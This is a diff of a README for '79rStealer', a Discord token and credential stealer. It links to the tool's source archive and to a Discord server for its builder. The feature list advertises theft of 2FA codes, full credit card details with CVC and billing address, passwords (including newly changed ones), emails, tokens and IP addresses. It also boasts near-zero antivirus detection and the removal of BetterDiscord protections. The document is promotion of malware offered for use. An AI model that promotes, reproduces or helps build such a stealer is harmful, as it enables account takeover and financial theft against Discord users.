@@ -1,2 +1,53 @@
-# 79rStealer
-Official 79r Repos - Discord Token Grabber / Discord Token Stealer with Discord password, whole credit card, 2FA codes (Password even when it changes)
+#### ``-`` [Source](https://github.com/79r/79rStealer/archive/refs/heads/main.zip) ``-`` [Builder](https://discord.gg/Sh236kfpvK)
+
+
+# Features
+- 2FA Codes
+- Low Detections (0/64)
+- Configuration System
+- Log all friends owning a "rare" badge.
+- Discord Credit Card Stealing
+    - Credit Card Number
+    - CVC
+    - Credit Card Expirations (month & years)
+    - Country
+    - State
+    - City
+    - ZIP Code
+    - Address
+    - Username
+    - Nitro
+    - Badges
+    - ID
+    - Email
+    - Token
+- Discord Login Stealing
+    - Username
+    - Nitro
+    - Badges
+    - ID
+    - Email
+    - Password
+    - Token
+    - Valid Billing and type
+- Discord Change Password
+    - Username
+    - Nitro
+    - Badges
+    - ID
+    - Old Password
+    - New Password
+    - Token
+    - Valid Billing and type
+- Discord Change Email
+    - Username
+    - Nitro
+    - Badges
+    - ID
+    - New Email
+    - Password
+    - Token
+    - Valid Billing and type
+- IP
+- Remove QR Code
+- BetterDiscord Protection Remover
